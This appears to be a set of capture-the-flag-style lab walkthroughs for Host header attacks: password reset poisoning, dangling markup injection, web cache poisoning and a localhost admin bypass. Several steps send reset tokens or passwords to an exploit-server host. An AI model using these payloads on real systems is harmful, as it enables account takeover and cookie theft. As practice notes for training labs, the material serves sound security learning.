# Lab: Basic password reset poisoning

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Change the Host to exploit-[id].exploit-server.net/exploit -> Send -> Go to exploit server - access log -> You will get the token:
`GET /exploit/forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` ->
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` and then you can enter a new password -> then login as carlos



# Lab: Password reset poisoning via middleware

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Add `X-Forwarded-Host: exploit-[id].exploit-server.net/exploit` -> Send -> Go to exploit server - access log -> You will get the token: 
`GET /forgot-password?temp-forgot-password-token=85cjg3lq7f7k92tv3ywgpoxrzqvmbtue` -> 
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=85cjg3lq7f7k92tv3ywgpoxrzqvmbtue` and then you can enter a new password -> then login as carlos



# Lab: Password reset poisoning via dangling markup

Forgot password -> Enter your own username -> Capture POST request in Burp -> In Repeater, change Host header to add an arbitrary port: `[id].web-security-academy.net:1234` -> Send -> Go to exploit server -> Open email client -> View raw version of email -> Notice your port reflected unescaped in a link followed by the new password -> 
Now inject dangling markup: `Host: [id].web-security-academy.net:'<a href="//YOUR-EXPLOIT-ID.exploit-server.net/` -> Send -> Check email client (raw version) -> Go to exploit server access log -> Find `GET /?/login'>...` containing the rest of the email with your password -> Change username to `carlos` -> Send -> Refresh access log -> Get Carlos's new password from log -> Login as carlos



# Lab: Web cache poisoning via ambiguous requests

Home page -> Send GET / to Repeater -> Notice Host header validation -> Add cache buster: `GET /?cb=123` -> Add second Host header with arbitrary value -> Observe it's reflected in script URL: `/resources/js/tracking.js`

Exploit server -> Create `/resources/js/tracking.js` with `alert(document.cookie)` -> Copy exploit server domain

Back to Repeater -> Add second Host header: `Host: id.exploit-server.net` -> Send until cache hit (response shows your exploit server in script URL) -> Load `/?cb=123` in browser -> Alert fires

Remove cache buster -> Replay request repeatedly to poison cache -> Lab solved when victim visits home page



# Lab: Host header authentication bypass

Send GET / to Repeater -> Notice you can change Host header to anything and still access page -> Browse to `/robots.txt` -> Finds `/admin` panel -> Try `/admin` -> Access denied -> Error says local users only -> Send GET /admin to Repeater -> Change Host header to `localhost` -> Access granted (admin panel with delete option) -> Change request line to `GET /admin/delete?username=carlos` -> Send -> Lab solved
